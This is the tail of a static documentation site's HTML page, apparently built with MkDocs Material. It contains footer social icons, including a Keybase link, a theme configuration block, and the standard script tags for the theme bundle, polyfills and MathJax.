      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="m503.5 204.6-.7-1.8-69.7-181.78c-1.4-3.57-3.9-6.59-7.2-8.64-2.4-1.55-5.1-2.515-8-2.81-2.9-.295-5.7.083-8.4 1.11-2.7 1.02-5.1 2.66-7.1 4.78-1.9 2.12-3.3 4.67-4.1 7.44l-47 144H160.8l-47.1-144c-.8-2.77-2.2-5.31-4.1-7.43-2-2.12-4.4-3.75-7.1-4.77a18.1 18.1 0 0 0-8.38-1.113 18.4 18.4 0 0 0-8.04 2.793 18.09 18.09 0 0 0-7.16 8.64L9.267 202.8l-.724 1.8a129.57 129.57 0 0 0-3.52 82c7.747 26.9 24.047 50.7 46.447 67.6l.27.2.59.4 105.97 79.5 52.6 39.7 32 24.2c3.7 1.9 8.3 4.3 13 4.3 4.7 0 9.3-2.4 13-4.3l32-24.2 52.6-39.7 106.7-79.9.3-.3c22.4-16.9 38.7-40.6 45.6-67.5 8.6-27 7.4-55.8-2.6-82z"/></svg>
    </a>
  
    
    
      
      
    
    <a href="https://keybase.io/linxz" target="_blank" rel="noopener" title="keybase.io" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M286.17 419a18 18 0 1 0 18 18 18 18 0 0 0-18-18zm111.92-147.6c-9.5-14.62-39.37-52.45-87.26-73.71q-9.1-4.06-18.38-7.27a78.43 78.43 0 0 0-47.88-104.13c-12.41-4.1-23.33-6-32.41-5.77-.6-2-1.89-11 9.4-35L198.66 32l-5.48 7.56c-8.69 12.06-16.92 23.55-24.34 34.89a51 51 0 0 0-8.29-1.25c-41.53-2.45-39-2.33-41.06-2.33-50.61 0-50.75 52.12-50.75 45.88l-2.36 36.68c-1.61 27 19.75 50.21 47.63 51.85l8.93.54a214 214 0 0 0-46.29 35.54C14 304.66 14 374 14 429.77v33.64l23.32-29.8a148.6 148.6 0 0 0 14.56 37.56c5.78 10.13 14.87 9.45 19.64 7.33 4.21-1.87 10-6.92 3.75-20.11a178.29 178.29 0 0 1-15.76-53.13l46.82-59.83-24.66 74.11c58.23-42.4 157.38-61.76 236.25-38.59 34.2 10.05 67.45.69 84.74-23.84.72-1 1.2-2.16 1.85-3.22a156.09 156.09 0 0 1 2.8 28.43c0 23.3-3.69 52.93-14.88 81.64-2.52 6.46 1.76 14.5 8.6 15.74 7.42 1.57 15.33-3.1 18.37-11.15C429 443 434 414 434 382.32c0-38.58-13-77.46-35.91-110.92zM142.37 128.58l-15.7-.93-1.39 21.79 13.13.78a93 93 0 0 0 .32 19.57l-22.38-1.34a12.28 12.28 0 0 1-11.76-12.79L107 119c1-12.17 13.87-11.27 13.26-11.32l29.11 1.73a144.35 144.35 0 0 0-7 19.17zm148.42 172.18a10.51 10.51 0 0 1-14.35-1.39l-9.68-11.49-34.42 27a8.09 8.09 0 0 1-11.13-1.08l-15.78-18.64a7.38 7.38 0 0 1 1.34-10.34l34.57-27.18-14.14-16.74-17.09 13.45a7.75 7.75 0 0 1-10.59-1s-3.72-4.42-3.8-4.53a7.38 7.38 0 0 1 1.37-10.34L214 225.19s-18.51-22-18.6-22.14a9.56 9.56 0 0 1 1.74-13.42 10.38 10.38 0 0 1 14.3 1.37l81.09 96.32a9.58 9.58 0 0 1-1.74 13.44zM187.44 419a18 18 0 1 0 18 18 18 18 0 0 0-18-18z"/></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    <script id="__config" type="application/json">{"base": "../../..", "features": ["header.autohide", "search.suggest", "search.highlight", "navigation.instant", "navigation.tracking", "navigation.tabs", "navigation.top", "content.code.annotate"], "search": "../../../assets/javascripts/workers/search.720157f5.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script>
    
    
      <script src="../../../assets/javascripts/bundle.4a0e3b6c.min.js"></script>
      
        <script src="../../../javascripts/mathjax.js"></script>
      
        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
      
        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
      
    
  </body>
</html>